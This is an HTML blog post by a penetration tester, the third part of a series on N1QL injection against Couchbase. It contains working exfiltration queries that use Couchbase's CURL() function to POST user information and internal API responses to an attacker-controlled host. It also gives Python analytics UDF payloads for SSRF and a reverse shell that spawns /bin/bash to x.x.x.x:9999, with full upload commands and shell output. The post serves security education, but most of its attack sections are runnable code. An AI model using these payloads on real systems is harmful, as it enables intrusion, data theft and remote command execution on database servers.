@@ -1,0 +1,271 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>N1QL Injection - Part 3 // FelSec - Blog</title>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.131.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="FelSec" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://felsec.com/css/main.min.b5f4fee110fa265e5b82f29f928caec6ee475bcd8dc3c01bc4a65205cec04336.css" />
+    <link rel="stylesheet" href="/css/code.css" />
+
+    
+  
+    
+      
+    
+  
+
+
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="N1QL Injection - Part 3">
+  <meta name="twitter:description" content="More fun with N1QL injection.">
+
+    <meta property="og:url" content="https://felsec.com/posts/n1qlinjection-part3/">
+  <meta property="og:site_name" content="FelSec - Blog">
+  <meta property="og:title" content="N1QL Injection - Part 3">
+  <meta property="og:description" content="More fun with N1QL injection.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-11-13T20:35:10+01:00">
+    <meta property="article:modified_time" content="2024-11-13T20:35:10+01:00">
+    <meta property="article:tag" content="Injection">
+    <meta property="article:tag" content="Couchbase">
+    <meta property="article:tag" content="N1QL">
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://felsec.com/"><img class="app-header-avatar" src="/avatar.png" alt="FelSec" /></a>
+      <h1>FelSec - Blog</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/posts/">Posts</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+      </nav>
+      <p>Penetration Tester. Security Enthusiast. Husband. Cat Dad.</p>
+      <div class="app-header-social">
+        
+          <a target="_blank" href="https://github.com/felsec" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg></a>
+        
+          <a target="_blank" href="https://twitter.com/felsec" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg></a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">N1QL Injection - Part 3</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Nov 13, 2024
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          5 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line>
+</svg>
+              <a class="tag" href="https://felsec.com/tags/injection/">Injection</a>
+              <a class="tag" href="https://felsec.com/tags/couchbase/">Couchbase</a>
+              <a class="tag" href="https://felsec.com/tags/n1ql/">N1QL</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h2 id="introduction">Introduction</h2>
+<p>In this post we are going to be build on the basics and exploits covered in parts 1 &amp; 2 (if you haven&rsquo;t read them already, you can find them here: <a href="/posts/n1qlinjection-part1">Part 1</a>, <a href="/posts/n1qlinjection-part2">Part 2</a>) and look at some other useful functions and features.</p>
+<p>Two main things we are going to look at are the built-in <code>CURL</code> function and the Analytics functionality.</p>
+<h2 id="curl">CURL</h2>
+<p>Couchbase have implemented their own <code>CURL()</code> function, which uses a subset of the cURL functionality and allows queries to interact with and include external JSON data sources in results. These federated queries, as stated in their documentation, can leverage the full querying capabilities of SQL++ (N1QL) including functions, expressions, sub-queries, JOINs, NESTs, etc. <a href="https://docs.couchbase.com/server/current/n1ql/n1ql-language-reference/curl.html">More Information</a></p>
+<p>For us as attackers, this means we have a built-in method for performing arbitrary web requests to internal web services (either on the same Couchbase server or within the same internal network) or external services. But, and it is a pretty big but, there are several limitations around the types of requests we are able to perform, the responses it can process and what users are able to use the function. Such as:</p>
+<ul>
+<li>Users are required to be full administrators or have the <code>QUERY_EXTERNAL_ACCESS</code> role in order to use the function;</li>
+<li>An access list of URLs allowed to be accessed must be set, or the function access set to <code>Unrestricted</code>;</li>
+<li>Only <code>GET</code> or <code>POST</code> requests can be performed;</li>
+<li>All responses must be in JSON format.</li>
+</ul>
+<p>Checking the user permissions can be done fairly easily with the following queries:</p>
+<pre tabindex="0"><code>select r from system:my_user_info UNNEST roles as r where r.`role`=&#39;query_external_access&#39;
+select r from system:my_user_info UNNEST roles as r where r.`role`LIKE&#39;%admin%&#39;and(r.`role`!=&#39;bucket_admin&#39; or r.`role`!=&#39;analytics_admin&#39;)
+</code></pre><p>If either of these queries return a valid role then you can use the <code>CURL</code> function.</p>
+<p>Attempting to use the <code>CURL</code> function will allow us to determine if the Couchbase instance is configured with restricted or unrestricted <code>CURL</code> access, based on the response. Unfortunately when restricted access is used, the only method to determine the host access list is to fuzz it. (<em>Note: Other than direct access via the Dashboard or CLI there does not appear to be an easy way of getting the information; however, I am looking into this and will update this post if another method is found</em>)</p>
+<p>The following examples show how the function can be used to our advantage.</p>
+<h3 id="exfiltrating-data-and-ssrf">Exfiltrating Data and SSRF</h3>
+<p>Basic Server-Side Request Forgery can be achieved with the following N1QL query:</p>
+<pre tabindex="0"><code>SELECT CURL(&#39;https://attacker/ssrf&#39;)
+</code></pre><p>The Couchbase server will reach out to the attacker-controlled server. The output of queries can be included in the <code>CURL</code> function by adding the following options:</p>
+<pre tabindex="0"><code>{
+    &#39;request&#39;:&#39;POST&#39;,
+    &#39;header&#39;:&#39;Content-Type: application/json&#39;,
+    &#39;data&#39;:(
+        ENCODE_JSON(
+            (&lt;QUERY&gt;)
+        )
+    )
+}
+</code></pre><p>For example the following N1QL query would return the current user&rsquo;s information to the remote server:</p>
+<pre tabindex="0"><code>SELECT CURL(
+    &#39;https://attacker/ssrf&#39;,
+    {
+        &#39;request&#39;:&#39;POST&#39;,
+        &#39;header&#39;:&#39;Content-Type: application/json&#39;,
+        &#39;data&#39;:(
+            ENCODE_JSON(
+                (select * from system:my_user_info)
+            )
+        )
+    }
+)
+</code></pre><p>Through this it is possible to exfiltrate various bits of information from the Couchbase server, including:</p>
+<ul>
+<li>DB information</li>
+<li>User information</li>
+<li>Documents</li>
+<li>Internal service information</li>
+</ul>
+<p>Since it is possible to use the <code>CURL</code> function to interact with internal as well as external services, it is also possible to exfiltratre the information from the internal services to our attacker-controlled server. The following query retrieves information from an internal API service and posts it to a remote server.</p>
+<pre tabindex="0"><code>SELECT CURL(
+    &#39;https://attacker/ssrf&#39;,
+    {
+        &#39;request&#39;:&#39;POST&#39;,
+        &#39;header&#39;:&#39;Content-Type: application/json&#39;,
+        &#39;data&#39;:(
+            ENCODE_JSON(
+                (SELECT CURL(&#39;http://127.0.0.1:8888/changelog&#39;))
+            )
+        )
+    }
+)
+</code></pre><p>The <code>CURL</code> function can also be used to:</p>
+<ul>
+<li>enumerate internal REST/API services</li>
+<li>perform rudimentary port scans of internal hosts</li>
+</ul>
+<h2 id="analytics">Analytics</h2>
+<p>The Analytics service is designed to support real-time, large-scale data analytics directly on operational data. It eliminates the need to extract, transform, and load (ETL) data into separate systems for analysis, making it ideal for scenarios requiring quick insights from fresh operational data. Enabling business intelligence and data exploration by providing the ability to query and analyse semi-structured JSON data without impacting the performance of operational workloads.</p>
+<h3 id="user-defined-functions">User Defined Functions</h3>
+<p>The Analytics service supports the use of User Defined Functions (UDFs) either through JavaScript, which is defined through queries, or python.</p>
+<p>UDFs defined through JavaScript contain a number of restrictions that limit their usefulness for exploiting the server. The python UDFs, however, do not have any limitations in what they are able to do or the functions they are allowed to call. While it does require the Couchbase server to be using Preview Mode, it gives a relatively easy method for gaining code execution on the server or potentially elevating your privileges.</p>
+<p>The following examples demonstrate how this can be used for SSRF and remote shell payloads. (<strong>Important Note</strong>: Privileged access to the Analytics service is required to exploit this. Additionally, network access to the Analytics service or the Couchbase console is also required.)</p>
+<h4 id="ssrf">SSRF</h4>
+<p>Payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">felsec</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">testing</span>(self):
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;Doing stuff&#39;</span>)
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;https://tsehajsyflxvxvoxxfqi1sj49q4fed3sl.oast.fun/ssrf/python/cb&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> r<span style="color:#f92672">.</span>text
+</span></span></code></pre></div><p>Package the Python payload with <code>shiv</code>:</p>
+<pre tabindex="0"><code>shiv -o ssrf.pyz --site-packages .
+</code></pre><p>Upload to the Couchbase Analytics service:</p>
+<pre tabindex="0"><code>&gt; curl -X POST -u Administrator:admin1 -F &#34;type=python&#34; -F &#34;data=@./ssrf.pyz&#34; 127.0.0.1:8095/analytics/library/Default/pylib
+
+Response: {}
+</code></pre><p>Create the UDF function:</p>
+<pre tabindex="0"><code>curl -u Administrator:admin1 http://127.0.0.1:8095/analytics/service \
+  -d &#39;statement=CREATE OR REPLACE ANALYTICS FUNCTION testing() AS &#34;ssrf&#34;,&#34;felsec.testing&#34; AT pylib;&#39;
+</code></pre><p>Call the UDF function:</p>
+<pre tabindex="0"><code>&gt; curl -u Administrator:admin1 http://127.0.0.1:8095/analytics/service \
+  -d &#39;statement=select testing();&#39;
+
+Response:
+{
+        &#34;requestID&#34;: &#34;4883c851-591b-490e-b453-481e079100a8&#34;,
+        &#34;signature&#34;: {
+                &#34;*&#34;: &#34;*&#34;
+        },
+        &#34;results&#34;: [ { &#34;$1&#34;: &#34;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;ls3def4q94js1iqfxxovxvxlfysjahest&lt;/body&gt;&lt;/html&gt;&#34; }
+ ]
+        ,
+        &#34;plans&#34;:{},
+        &#34;status&#34;: &#34;success&#34;,
+        &#34;metrics&#34;: {
+                &#34;elapsedTime&#34;: &#34;1.76102056s&#34;,
+                &#34;executionTime&#34;: &#34;1.742527434s&#34;,
+                &#34;compileTime&#34;: &#34;12.385838ms&#34;,
+                &#34;queueWaitTime&#34;: &#34;0ns&#34;,
+                &#34;resultCount&#34;: 1,
+                &#34;resultSize&#34;: 85,
+                &#34;processedObjects&#34;: 0
+        }
+}
+</code></pre><p>Request to the remote server from the Couchbase server:</p>
+<pre tabindex="0"><code>GET /ssrf/python/cb HTTP/1.1
+Host: tsehajsyflxvxvoxxfqi1sj49q4fed3sl.oast.fun
+Accept: */*
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+User-Agent: python-requests/2.31.0
+</code></pre><h4 id="reverse-shell">Reverse Shell</h4>
+<p>Payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> socket<span style="color:#f92672">,</span>subprocess<span style="color:#f92672">,</span>os;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">felsec</span>:
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">testing</span>(self):
+</span></span><span style="display:flex;"><span>		s<span style="color:#f92672">=</span>socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET,socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>		s<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#34;x.x.x.x&#34;</span>,<span style="color:#ae81ff">9999</span>))
+</span></span><span style="display:flex;"><span>		os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>		os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>		os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#f92672">import</span> pty
+</span></span><span style="display:flex;"><span>		pty<span style="color:#f92672">.</span>spawn(<span style="color:#e6db74">&#34;/bin/bash&#34;</span>)
+</span></span></code></pre></div><p>Package the Python payload with <code>shiv</code>:</p>
+<pre tabindex="0"><code>shiv -o remote.pyz --site-packages .
+</code></pre><p>Upload to the Couchbase Analytics service:</p>
+<pre tabindex="0"><code>&gt; curl -X POST -u Administrator:admin1 -F &#34;type=python&#34; -F &#34;data=@./remote.pyz&#34; 127.0.0.1:8095/analytics/library/Default/pylib
+
+Response: {}
+</code></pre><p>Create the UDF function:</p>
+<pre tabindex="0"><code>curl -u Administrator:admin1 http://127.0.0.1:8095/analytics/service \
+  -d &#39;statement=CREATE OR REPLACE ANALYTICS FUNCTION testing() AS &#34;remote&#34;,&#34;felsec.testing&#34; AT pylib;&#39;
+</code></pre><p>Reverse shell:</p>
+<pre tabindex="0"><code>&gt; nc -lvnp 9999
+Listening on 0.0.0.0 9999
+Connection received on x.x.x.x 54726
+&lt;ions/library/storage/Default/pylib/rev_1/contents$ hostname
+hostname
+0ea06754e662
+&lt;ions/library/storage/Default/pylib/rev_1/contents$ pwd
+pwd
+/opt/couchbase/var/lib/couchbase/data/@analytics/v_iodevice_0/applications/library/storage/Default/pylib/rev_1/contents
+&lt;ions/library/storage/Default/pylib/rev_1/contents$ id
+id
+uid=1000(couchbase) gid=1000(couchbase) groups=1000(couchbase)
+&lt;ions/library/storage/Default/pylib/rev_1/contents$
+</code></pre>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
